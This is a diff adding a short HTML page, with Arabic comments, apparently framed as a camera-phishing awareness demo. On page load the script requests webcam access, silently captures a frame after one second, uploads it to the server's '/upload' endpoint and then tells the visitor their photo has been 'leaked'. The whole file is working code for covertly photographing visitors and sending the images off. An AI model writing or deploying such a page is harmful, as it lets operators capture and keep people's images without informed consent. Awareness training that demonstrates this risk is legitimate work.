@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <script>
+        // طلب الوصول إلى الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                // التقاط الصورة تلقائيًا بعد فترة قصيرة من فتح الصفحة
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // التقاط الصورة بعد 1 ثانية
+                const canvas = document.createElement('canvas');
+                canvas.width = 320; // عرض الصورة
+                canvas.height = 240; // ارتفاع الصورة
+                const context = canvas.getContext('2d');
+
+                // إظهار رسالة "تم تسريب صورتك" بعد التقاط الصورة
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // إرسال الصورة إلى السيرفر
+                    const imgData = canvas.toDataURL('image/png');
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: imgData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data);
+                        alert("تم تسريب صورتك!"); // رسالة بعد الموافقة
+                    })
+                    .catch(error => {
+                        console.error('خطأ في إرسال الصورة:', error);
+                    });
+
+                    // إيقاف البث بعد التقاط الصورة
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000); // التقاط الصورة بعد 1 ثانية
+            })
+            .catch(err => {
+                console.error("حدث خطأ أثناء الوصول إلى الكاميرا: " + err);
+                alert("شكرا لوعيك!"); // رسالة عند عدم الموافقة
+            });
+    </script>
+</body>
+</html>
